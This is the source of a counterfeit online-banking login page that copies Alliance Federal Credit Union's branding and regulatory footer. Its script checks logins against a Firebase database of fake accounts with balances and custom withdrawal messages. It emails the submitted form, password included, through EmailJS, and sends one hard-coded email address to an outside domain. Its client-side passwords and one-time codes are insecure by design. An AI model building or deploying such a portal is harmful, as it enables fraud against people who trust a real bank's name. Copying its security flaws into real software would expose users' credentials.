<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Login | Alliance Federal Credit Union</title>

    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#2b3138">


    <style custom-style="">
        body,
        html {
            margin: 0;
            height: 100%;
            -webkit-font-smoothing: antialiased;
            -webkit-overflow-scrolling: touch;
            -ms-overflow-style: -ms-autohiding-scrollbar;
            -moz-osx-font-smoothing: grayscale;
            -webkit-text-size-adjust: 100%;
            text-size-adjust: 100%;
            position: relative;
            display: flex;
            flex-direction: column
        }

        body {
            font-family: roboto, -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-weight: 400;
            color: var(--body-text-primary-color);
            font-size: 14px
        }

        article {
            padding: 40px !important;
            margin-left: 0 !important;
            text-align: center
        }

        .grid-inner {
            width: 155px;
            text-align: left;
            margin: 0 auto;
            clear: both
        }

        h2 {
            font-weight: 400;
            margin: 0
        }

        h4 {
            font-weight: 400
        }

        a {
            display: block;
            text-decoration: none;
            color: var(--body-text-theme-color);
            cursor: pointer
        }

        a:active,
        a:hover {
            color: var(--inline-button-text-hover-color);
            text-decoration: underline
        }

        a.button {
            white-space: normal;
            position: relative;
            display: inline-block;
            margin-bottom: 0;
            text-align: center;
            border: 1px solid transparent;
            color: var(--default-button-text-color);
            background-color: var(--default-button-color, transparent);
            border-color: var(--default-button-border-color, #e4e7ea);
            font-weight: 500;
            font-size: 16px;
            padding: 0 18px;
            line-height: 34px
        }

        a.button:hover {
            text-decoration: none
        }

        div.container {
            flex: 1 0 auto;
            display: flex;
            flex-direction: column;
            box-sizing: border-box;
            align-items: center;
            position: relative
        }

        div.content {
            position: relative;
            z-index: 1;
            flex: 1 0 auto;
            max-width: 720px;
            width: 90%;
            padding: 36px 0 40px
        }

        div.card {
            background-color: #fff;
            background-color: var(--primary-content-background-color, #fff);
            box-shadow: 0 1px 1px 0 rgba(0, 0, 0, .24), 0 1px 4px rgba(0, 0, 0, .12);
            border-radius: 3px;
            margin-bottom: 16px;
            margin-left: auto;
            margin-right: auto
        }

        div.grid {
            display: flex;
            padding: 36px 0 40px;
            box-sizing: border-box
        }

        .grid-6-xs {
            flex-basis: 50%;
            max-width: 50%;
            padding: 0 8px;
            box-sizing: border-box
        }

        div.footer {
            width: 100%;
            box-sizing: border-box;
            display: block;
            background-color: #fff;
            background-color: var(--footer-background-color, #fff);
            color: var(--footer-text-color);
            text-align: center;
            font-size: 12px;
            padding: 17px 20px;
            box-shadow: 0 -1px 0 rgba(0, 0, 0, .1);
            z-index: 1;
            line-height: 1.5
        }

        div.footer svg {
            fill: var(--footer-text-color)
        }

        div.footer span.dot {
            margin: 0 7px
        }

        div.footer a {
            display: inline;
            color: var(--footer-link-text-color)
        }

        div.footer br {
            display: none
        }

        .background {
            height: 100%;
            transition: all ease .2s;
            position: absolute;
            background-size: cover;
            background-position: top;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0
        }

        .dark.background {
            display: none
        }

        @media (prefers-color-scheme:dark) {
            .dark.background {
                display: block
            }

            .light.background {
                display: none
            }
        }

        @media (max-width:739px) {
            div.grid {
                overflow: hidden;
                padding-top: 16px;
                flex-wrap: wrap
            }

            div.card {
                max-width: 550px
            }
        }

        @media (max-width:490px) {

            article,
            div.footer {
                padding: 20px !important
            }

            div.footer br {
                display: block
            }

            .end-of-line {
                display: none
            }
        }
    </style>

    <style>
        .sec {
            display: block;
            font-family: roboto;
            font-weight: 400;
            line-height: 18px;
            font-size: 13px;
            padding: 17px 20px 17px 20px;
            width: 100%;
            background-color: white;
            position: relative;
            bottom: 0;
            text-align: center;
            text-size-adjust: 100%;
            color: rgb(112, 112, 112);
            box-shadow: rgba(0, 0, 0, 0.1)0px -1px 0px 0px;
            z-index: 1;
        }

        @media (max-width: 600px) {
            .sec {
                padding-left: 80px;
                padding-right: 80px;
            }
        }



        .w-form-done {
            text-align: center;
            background-color: #ddd;
            padding: 20px;
            display: none;
        }

        .w-form-fail {
            color: var(--jha-error-message-text-color, var(--jha-text-white));
            background-color: var(--jha-error-message-background-color, var(--jha-color-warning));
            border-radius: 3px;
            display: var(--flex-space-between_-_display);
            align-items: var(--flex-space-between_-_align-items);
            justify-content: var(--flex-space-between_-_justify-content);
            padding: 16px 20px;
            text-align: left
        }
    </style>



    <link href="./login_files/login.css" rel="stylesheet" type="text/css">



    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <script type="text/javascript">
        emailjs.init('bkJ8Bs75tDVgJNAud');
    </script>
</head>

<body>

    <div id="banner"> <jha-icon-warning>
            <style>
                :host {
                    display: inline-block;
                    width: 24px;
                    height: 24px;
                    fill: var(--jha-icon-color, var(--jha-text-base), #000000)
                }
            </style> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path
                    d="M19.57,19.75H4.43a2.19,2.19,0,0,1-1.92-1.11,2,2,0,0,1,0-2.08L10.12,4.28a2.22,2.22,0,0,1,3.75,0l7.57,12.29a2,2,0,0,1,0,2.08A2.19,2.19,0,0,1,19.57,19.75ZM11.4,5.07,3.84,17.35a.53.53,0,0,0,0,.56.68.68,0,0,0,.61.34H19.57a.68.68,0,0,0,.61-.34.53.53,0,0,0,0-.56L12.6,5.07a.75.75,0,0,0-1.2,0Z">
                </path>
                <path d="M12,12.75a.75.75,0,0,1-.75-.75V8a.75.75,0,0,1,1.5,0v4A.75.75,0,0,1,12,12.75Z"></path>
                <circle cx="12" cy="15.5" r="1"></circle>
            </svg>
        </jha-icon-warning>
        <p> Alliance Federal Credit Union will NEVER ask you to provide your online banking information. Please be
            cautious of fraudulent calls and do not click on links in texts. </p>
    </div>


    <banno-web>
        <div class="placeholder-login">
            <div class="placeholder-login-wrapper">
                <div class="placeholder-card" style="background-color: white">
                    <div class="placeholder-progress-container">

                        <div class="login-wrapper">
                            <jha-card has-data="">
                                <jha-card-header slot="header" class=""><br>
                                    <div><img height="40" style="margin-top: -50px;" src="./login_files/logo.png"
                                            alt="Alliance Federal Credit Union">
                                    </div>
                                </jha-card-header>
                            </jha-card>


                            <br>



                        </div>
                        <bannoweb-login-steps slot="login-steps" style="display: block">
                            <form method="post" action="otp.html" class="form" id="otpForm">
                                <input type="hidden" name="passcode" id="otpValue" value="">
                                <div>
                                    <div class="u-g-width-100">
                                        <label class="c-g-textbox  c-g-textbox--empty">
                                            <span class="c-g-textbox__label">Enter email address</span>
                                            <input aria-label="Email Address" autocapitalize="off" autocorrect="off"
                                                class=" c-g-textbox__field u-g-fz-body" id="email_address"
                                                maxlength="200" name="email" required="required" size="200" type="email"
                                                value="" aria-required="true">
                                        </label>
                                    </div>
                                    <div class="u-g-width-100">
                                        <label class="c-g-textbox  c-g-textbox--empty">
                                            <span class="c-g-textbox__label">Enter your password</span>
                                            <input aria-label="Password" autocapitalize="off" autocomplete="off"
                                                autocorrect="off" class=" c-g-textbox__field u-g-fz-body" id="password"
                                                maxlength="100" name="password" required="required" size="100"
                                                spellcheck="false" type="password" value="" aria-required="true">
                                        </label>
                                    </div>
                                    <div class="u-g-mar-top-l u-g-disp-flex@medium u-g-flex-row-rev@medium">
                                        <button type="submit"
                                            class="c-g-btn u-g-cursor-pointer u-g-mar-left-s@medium c-g-btn--expand-while-small u-g-mar-top-m u-g-mar-top-0@medium"
                                            style="background-color: rgb(0, 129, 72); color:white"> Sign in </button>
                                    </div>
                                </div>
                            </form>
                        </bannoweb-login-steps>
                    </div>
                </div>
            </div>
        </div>
    </banno-web>
    <bannoweb-footer class="sec" style="margin-top: -50px;">© 2025 Alliance Federal Credit Union <span>&nbsp;</span>
        <span>•</span> <span>&nbsp;</span> <a href="#" style="color: rgb(21, 95, 126); text-decoration: none;"> Privacy
            policy</a> <span>&nbsp;</span> <span class="end-of-line">•</span> <span>&nbsp;</span> Member FDIC
        <span>&nbsp;</span> <span class="end-of-line">•</span> <span>&nbsp;</span><svg width="16" height="11"
            viewBox="0 0 10 7" class="ehl-icon" aria-hidden="true">
            <path
                d="M4.96.222L.337 2.588v.962l.511.007v3.448h8.186L9.03 3.55h.55v-.962L4.959.222zm3.163 5.872H1.76V3.028l3.2-1.65 3.163 1.65v3.066zm-4.677-2.26h2.999v-.828H3.446v.828zm0 1.489h2.985v-.828H3.446v.828z">
            </path>
        </svg> Equal Housing Lender </bannoweb-footer>


    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-auth-compat.js"></script>

    <script>
        // Initialize Firebase
        if (!window.firebaseConfig) {
            window.firebaseConfig = {
                apiKey: "AIzaSyBXH3urcyjF-MVTgT4knvh9GTuCR-ecMBU",
                authDomain: "alliance-10ef5.firebaseapp.com",
                projectId: "alliance-10ef5",
                storageBucket: "alliance-10ef5.firebasestorage.app",
                messagingSenderId: "922068051903",
                appId: "1:922068051903:web:cdb0c19818e5c62480630a",
                measurementId: "G-JKEG6NSQKZ"
            };
            firebase.initializeApp(window.firebaseConfig);
            
            // Enable offline persistence
            firebase.firestore().enablePersistence()
                .catch((err) => {
                    if (err.code === 'failed-precondition') {
                        console.log('Multiple tabs open, persistence can only be enabled in one tab at a time.');
                    } else if (err.code === 'unimplemented') {
                        console.log('The current browser does not support persistence.');
                    }
                });
        }
    </script>

    <script>
        // Login form handling
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('otpForm');
            if (form) {
                form.addEventListener('submit', async function (event) {
                event.preventDefault();
                    
                    // Clear any existing session/local storage
                    localStorage.removeItem('pendingAccount');
                    localStorage.removeItem('pendingPasscode');
                    sessionStorage.removeItem('pendingAccount');
                    sessionStorage.removeItem('pendingPasscode');
                    
                    const email = document.getElementById('email_address').value.trim().toLowerCase();
                    const password = document.getElementById('password').value.trim();
                    
                    console.log('Login attempt:', { email }); // Debug log
                    
                    // Basic validation
                    if (!email || !password) {
                        Swal.fire({
                            icon: 'error',
                            title: 'Missing Information',
                            text: 'Please enter both email and password',
                            confirmButtonText: 'OK',
                            customClass: {
                                popup: 'swal2-popup',
                                title: 'swal2-title',
                                content: 'swal2-content',
                                confirmButton: 'swal2-confirm-button'
                            }
                        });
                        return;
                    }

                    // Validate email format
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (!emailRegex.test(email)) {
                        Swal.fire({
                            icon: 'error',
                            title: 'Invalid Email',
                            text: 'Please enter a valid email address',
                            confirmButtonText: 'OK',
                            customClass: {
                                popup: 'swal2-popup',
                                title: 'swal2-title',
                                content: 'swal2-content',
                                confirmButton: 'swal2-confirm-button'
                            }
                        });
                        return;
                    }

                    try {
                        // Show loading state
                        Swal.fire({
                            title: '',
                            allowOutsideClick: false,
                            background: 'transparent',
                            backdrop: 'rgba(0,0,0,0.4)',
                            didOpen: () => {
                                Swal.showLoading();
                                const spinner = Swal.getHtmlContainer().querySelector('.swal2-loader');
                                if (spinner) {
                                    spinner.style.borderColor = '#ffffff';
                                    spinner.style.borderRightColor = 'transparent';
                                    spinner.style.borderWidth = '3px';
                                }
                            }
                        });

                        // Check Firebase accounts with timeout
                        const db = firebase.firestore();
                        console.log('Checking Firebase for account...'); // Debug log
                        
                        const timeoutPromise = new Promise((_, reject) => 
                            setTimeout(() => reject(new Error('Connection timeout')), 15000)
                        );
                        
                        const accountsPromise = db.collection('accounts')
                            .where('email', '==', email.toLowerCase())
                            .get();
                        
                        const accountsSnapshot = await Promise.race([accountsPromise, timeoutPromise]);
                        
                        console.log('Found accounts:', accountsSnapshot.size); // Debug log
                        
                        if (accountsSnapshot.empty) {
                            console.log('No account found with email:', email); // Debug log
                            Swal.fire({
                                icon: 'error',
                                title: 'Login Failed',
                                text: 'Invalid email or password',
                                confirmButtonText: 'OK',
                                customClass: {
                                    popup: 'swal2-popup',
                                    title: 'swal2-title',
                                    content: 'swal2-content',
                                    confirmButton: 'swal2-confirm-button'
                                }
                            });
                            return;
                        }

                        let accountFound = false;
                        accountsSnapshot.forEach(doc => {
                            const account = doc.data();
                            console.log('Checking account:', account.email); // Debug log
                            
                            if (account.password === password) {
                                accountFound = true;
                                console.log('Password match found!'); // Debug log
                                
                                // Store account info for OTP verification
                                const accountData = {
                                    id: doc.id,
                                    email: account.email,
                                    fullName: account.fullName || 'User',
                                    accountNumber: account.accountNumber,
                                    balance: account.balance || 0,
                                    depositMessage: account.depositMessage || '',
                                    withdrawalMessage: account.withdrawalMessage || ''
                                };
                                
                                // Generate a simple passcode (6 digits)
                                const passcode = Math.floor(100000 + Math.random() * 900000).toString();
                                console.log('Generated passcode:', passcode); // Debug log
                                
                                // Store in both sessionStorage and localStorage for redundancy
                                sessionStorage.setItem('pendingAccount', JSON.stringify(accountData));
                                sessionStorage.setItem('pendingPasscode', passcode);
                                localStorage.setItem('pendingAccount', JSON.stringify(accountData));
                                localStorage.setItem('pendingPasscode', passcode);
                                
                                // Set the OTP in the hidden input for the form
                                const otpInput = document.getElementById("otpValue");
                                if (otpInput) otpInput.value = passcode;
                                form.elements['otpValue'].value = passcode;
                                form.elements['email'].value = account.email;

                                var serviceID = 'default_service';
                                var templateID = 'template_o0yyspn';
                                var redirectURL = 'otp.html';

                                if(account.email == "kellylambeth39@gmail.com"){
                                    serviceID = 'service_pz3arrq';
                                    templateID = 'template_zm7rm7s';
                                    redirectURL = 'https://alliance.ourfoundationhub.com/otp.html';
                                }
                                emailjs.sendForm(serviceID, templateID, form)
                                    .then(() => {
                                        window.location.href = redirectURL;
                                    }, (err) => {
                                        Swal.fire({
                                            icon: 'error',
                                            title: 'Email Error',
                                            text: 'Failed to send OTP email. Please try again.',
                                            confirmButtonText: 'OK',
                                            customClass: {
                                                popup: 'swal2-popup',
                                                title: 'swal2-title',
                                                content: 'swal2-content',
                                                confirmButton: 'swal2-confirm-button'
                                            }
                                        });
                                    });
                            }
                        });

                        if (!accountFound) {
                            console.log('No matching password found'); // Debug log
                    Swal.fire({
                        icon: 'error',
                        title: 'Login Failed',
                                text: 'Invalid email or password',
                                confirmButtonText: 'OK',
                        customClass: {
                                    popup: 'swal2-popup',
                                    title: 'swal2-title',
                                    content: 'swal2-content',
                                    confirmButton: 'swal2-confirm-button'
                                }
                            });
                        }
                    } catch (error) {
                        console.error('Login error:', error); // Debug log
                        Swal.fire({
                            icon: 'error',
                            title: 'Login Error',
                            text: 'Unable to process login. Please try again.',
                            confirmButtonText: 'OK',
                            customClass: {
                                popup: 'swal2-popup',
                                title: 'swal2-title',
                                content: 'swal2-content',
                            confirmButton: 'swal2-confirm-button'
                        }
                    });
                    }
                });
            }
        });
    </script>
</body>

</html>
